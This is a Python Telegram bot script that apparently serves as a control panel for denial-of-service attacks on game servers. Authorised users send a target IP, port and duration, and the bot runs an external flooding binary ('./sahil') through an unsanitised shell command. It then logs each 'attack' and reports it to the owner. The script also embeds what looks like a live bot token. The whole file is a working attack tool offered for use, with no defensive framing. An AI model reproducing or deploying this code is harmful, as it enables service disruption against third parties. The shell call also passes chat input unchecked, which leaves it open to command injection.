# Kasukabe0

import telebot
import subprocess
import datetime
import os

bot = telebot.TeleBot('8150511104:AAEvKiB0DHxy5XOzW9ifbgIFdm-U_7x9wuo')

admin_id = {"6512242172"}  # Owner ID

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

allowed_user_ids = []
running_attack = False  # Global variable to track running attack

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global running_attack
    user_id = str(message.chat.id)

    if user_id not in allowed_user_ids and user_id not in admin_id:
        bot.reply_to(message, "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ 🤬")
        return

    if running_attack and user_id not in admin_id:
        bot.reply_to(message, "🚨 Attack already running! Please wait until the current attack finishes!")
        return

    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        port = int(command[2])
        time = int(command[3])

        if time > 301:
            bot.reply_to(message, "ᴇʀʀᴏʀ: ᴍᴀx ᴀᴛᴛᴀᴄᴋ sᴇᴄᴏɴᴅ 300sᴇᴄ ❌.")
            return

        log_command(user_id, target, port, time)
        bot.reply_to(message, f"🚀 𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧:\n🎯 𝐈𝐏: {target}\n⛱️ 𝙋𝙤𝙧𝙩: {port}\n⌚ 𝐓𝐢𝐦𝐞: {time}")

        running_attack = True
        full_command = f"./sahil {target} {port} {time} 1000 4096"
        subprocess.run(full_command, shell=True)
        running_attack = False

        owner_msg = f"🔰 Attack Completed!\n📌 User: @{bot.get_chat(user_id).username}\n🎯 IP: {target}\n🚀 Port: {port}\n⌛ Time: {time}s"
        bot.send_message(list(admin_id)[0], owner_msg)

        bot.reply_to(message, f"✅ Attack on {target}:{port} completed successfully!")

    else:
        bot.reply_to(message, "ᴜsᴀɢᴇ✅ :- /bgmi <target> <port> <time>\nhttps://t.me/kasukabe0")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
